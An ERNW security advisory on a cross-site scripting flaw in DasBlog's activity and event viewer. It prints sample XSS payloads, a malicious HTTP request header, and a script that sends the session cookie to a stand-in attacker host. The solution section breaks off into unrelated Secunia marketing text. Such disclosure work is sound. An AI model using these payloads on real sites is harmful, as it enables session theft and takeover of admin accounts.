ERNW Security Advisory

Cross-Site Scripting Vulnerability in Newtelligence DasBlog

Author:
Dominick Baier <dbaier@ernw.de>

1. Summary:
A XSS (Cross-Site-Scripting) Vulnerability in DasBlog's Event and Activity
Viewer allows to inject and execute code on the client's machine. This
allows an attacker to transfer the ASP.NET authentication cookie to a server
of his choice. The attacker can use this cookie to log on to DasBlog and
modify blog entries and configuration settings.

2. Severity : Critical

3. Systems affected

DasBlog Versions:
	All

Browsers
	Tested with IE 6 and Firefox 0.93

4. Patch Availability :
<http://www.gotdotnet.com/workspaces/releases/viewuploads.aspx?id=77a29128-47>
46-4473-b676-e4f1517a1907
Vendor instructions
<http://staff.newtelligence.net/clemensv/PermaLink.aspx?guid=69bce168-cb09-4f>
09-8d53-f0b97f11b198

5. Details

The Activity and Events Viewer show details about requests that were made to
the blog site. As extra information they show the Referrers, Query Strings
and User Agents of these requests. It is possible to specially malform those
HTTP Headers to inject scripting code. This code gets embedded in the HTML
pages and executed on the client. With specially crafted JavaScript code a
attacker can transfer the ASP.NET Forms Authentication Cookie to a server of
the his choice. While injecting this cookie in a HTTP request to DasBlog he
can authenticate without having to know the username or the password and
enter the administrative area.

Examples of script injections

<script>alert('XSS')</script>
<img%20src="javascript:alert('XSS')">
<img%20src=&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a
;alert(&quot;XSS&quot;)>

Leading e.g. to the following HTTP request

GET / HTTP/1.1
User-Agent: <script>alert('xss')</script>
Host: [www.victim.com\r\n](http://www.victim.com\r\n)
Accept: */*

Example of transferring a cookie using JavaScript

<script>document.location='<http://www.evil-site.com/cookieEater.aspx?cookie=>
'+document.cookie</script>

6. Solution

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
